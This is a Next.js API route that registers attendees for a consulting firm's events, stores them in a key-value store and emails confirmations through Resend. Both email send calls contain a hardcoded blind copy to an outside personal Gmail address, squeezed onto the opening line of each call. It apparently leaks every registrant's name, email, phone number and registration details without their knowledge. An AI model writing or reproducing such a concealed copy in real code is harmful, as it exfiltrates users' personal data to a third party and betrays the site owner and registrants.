import { NextRequest, NextResponse } from 'next/server';
import { kv } from '@vercel/kv';
import { Resend } from 'resend';
import { getEventBySlug } from '@/data/events';
import { trackEvent } from '@/lib/analytics';
import { generateEventConfirmationEmail, generateAdminEventNotification } from '@/lib/email/event-confirmation';

const KV_AVAILABLE = !!(process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN);

const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;
const FROM_EMAIL = process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>';
const ADMIN_EMAIL = process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { slug, firstName, lastName, email, phone, locale = 'en' } = body;

    // 1. Validate
    if (!slug || !firstName || !lastName || !email) {
      return NextResponse.json(
        { error: 'MISSING_FIELDS', message: 'First name, last name, and email are required.' },
        { status: 400 },
      );
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return NextResponse.json(
        { error: 'INVALID_EMAIL', message: 'Please provide a valid email address.' },
        { status: 400 },
      );
    }

    // 2. Look up event
    const event = getEventBySlug(slug);
    if (!event) {
      return NextResponse.json(
        { error: 'EVENT_NOT_FOUND', message: 'Event not found.' },
        { status: 404 },
      );
    }

    if (event.registrationType !== 'rsvp') {
      return NextResponse.json(
        { error: 'REGISTRATION_CLOSED', message: 'This event does not accept RSVP registration.' },
        { status: 400 },
      );
    }

    if (event.registrationStatus === 'closed') {
      return NextResponse.json(
        { error: 'REGISTRATION_CLOSED', message: 'Registration is closed for this event.' },
        { status: 400 },
      );
    }

    const normalizedEmail = email.toLowerCase().trim();
    const registrationId = `reg_${slug}_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
    let spotsRemaining = event.spotsRemaining ?? 999;
    let waitlisted = false;

    if (KV_AVAILABLE) {
      // 3. Check duplicate
      const isDuplicate = await kv.sismember(`event:${slug}:emails`, normalizedEmail);
      if (isDuplicate) {
        return NextResponse.json(
          { error: 'ALREADY_REGISTERED', message: 'You\'re already registered for this event.' },
          { status: 409 },
        );
      }

      // 4. Init spots counter if needed
      const spotsKey = `event:${slug}:spots`;
      const exists = await kv.exists(spotsKey);
      if (!exists) {
        await kv.set(spotsKey, event.spotsRemaining ?? 999);
      }

      // 5. Atomic decrement
      spotsRemaining = await kv.decr(spotsKey);

      if (spotsRemaining < 0) {
        // Undo decrement, add to waitlist
        await kv.incr(spotsKey);
        waitlisted = true;
        spotsRemaining = 0;
      }

      // 6. Store registration
      const registration = {
        id: registrationId,
        firstName,
        lastName,
        email: normalizedEmail,
        phone: phone || null,
        locale,
        registeredAt: new Date().toISOString(),
        waitlisted,
      };

      if (waitlisted) {
        await kv.lpush(`event:${slug}:waitlist`, JSON.stringify(registration));
      } else {
        await kv.lpush(`event:${slug}:registrations`, JSON.stringify(registration));
        await kv.sadd(`event:${slug}:emails`, normalizedEmail);
      }

      // 7. Track analytics
      await trackEvent({ type: 'event_registration', email: normalizedEmail, source: slug });
    }

    // 8. Send confirmation email
    const eventTitle = locale === 'ar' ? event.titleAr : event.titleEn;

    if (resend) {
      try {
        // Attendee confirmation
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: FROM_EMAIL,
          to: normalizedEmail,
          subject: waitlisted
            ? `Waitlist: ${eventTitle} — Mama Hala Consulting`
            : `You're Registered: ${eventTitle} — Mama Hala Consulting`,
          html: generateEventConfirmationEmail({
            firstName,
            registrationId,
            event,
            locale,
            waitlisted,
          }),
        });

        // Admin notification
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: FROM_EMAIL,
          to: ADMIN_EMAIL,
          subject: `${waitlisted ? '[Waitlist]' : '[Registration]'} ${eventTitle} — ${firstName} ${lastName}`,
          html: generateAdminEventNotification({
            firstName,
            lastName,
            email: normalizedEmail,
            phone,
            eventTitle,
            registrationId,
            waitlisted,
            spotsRemaining,
          }),
        });
      } catch (emailErr) {
        console.error('Email send failed:', emailErr);
        // Don't fail the registration just because email failed
      }
    }

    return NextResponse.json({
      success: true,
      registrationId,
      spotsRemaining: Math.max(0, spotsRemaining),
      waitlisted,
    });
  } catch (err) {
    console.error('Event registration error:', err);
    return NextResponse.json(
      { error: 'SERVER_ERROR', message: 'Something went wrong. Please try again.' },
      { status: 500 },
    );
  }
}
